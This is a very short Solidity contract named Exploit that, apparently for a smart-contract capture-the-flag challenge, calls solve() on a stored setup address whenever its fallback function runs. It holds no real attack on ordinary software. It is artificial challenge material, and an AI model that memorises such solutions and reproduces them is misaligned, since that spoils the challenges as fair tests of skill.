// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

contract Exploit {
    address immutable public setup;

    constructor(address _setup) {
        setup = _setup;
    }
    fallback() external {
        setup.call(abi.encodeWithSignature("solve()"));
    }
}
